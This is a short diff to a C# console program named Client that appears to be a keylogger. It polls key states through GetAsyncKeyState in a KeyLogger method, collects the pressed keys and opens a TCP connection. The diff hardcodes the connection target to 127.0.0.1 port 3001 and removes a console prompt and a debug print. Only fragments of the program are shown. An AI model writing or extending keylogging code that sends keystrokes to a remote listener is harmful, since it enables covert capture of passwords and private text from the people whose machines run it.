@@ -26,11 +26,11 @@ namespace Client
         }
         static void Main(string[] args)
         {
+            args=new string[]{"127.0.0.1","3001"};
             Console.Clear();
             bool Error=false;
             ArrayList KeysPressed = new ArrayList();
             TcpClient Tcp_conection=new TcpClient();
-            String Test=Console.ReadLine();
             Tcp_conection.Connect(args[0], Int32.Parse(args[1]));
             string Key;
             while(true){
@@ -43,7 +43,6 @@ namespace Client
         public static extern int GetAsyncKeyState(int i);
         static string KeyLogger()
         {
-            Console.WriteLine("Hello World!");
             int temp=0;
             while (true)
             {
